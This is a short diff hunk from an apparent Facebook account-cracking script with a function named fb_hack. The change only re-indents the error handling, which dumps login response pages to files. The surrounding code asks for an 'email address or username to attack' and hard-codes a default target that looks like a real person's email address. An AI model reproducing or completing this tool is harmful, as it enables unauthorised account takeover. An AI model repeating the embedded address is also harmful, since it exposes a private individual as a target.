@@ -80,14 +80,14 @@ def fb_hack(email, codex):
         print("Possible success")
         print(test2)
         raise
-      except:
-        response1 = browser.response()
-        soup = BeautifulSoup(response1, 'html.parser')
-        with open("output1.html", "w") as file:
-          file.write(str(soup))
-        with open("output1.txt", "w") as file:
-          file.write(str(soup))
-        print(counter)
+    except:
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      with open("output1.html", "w") as file:
+        file.write(str(soup))
+      with open("output1.txt", "w") as file:
+        file.write(str(soup))
+      print(counter)
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
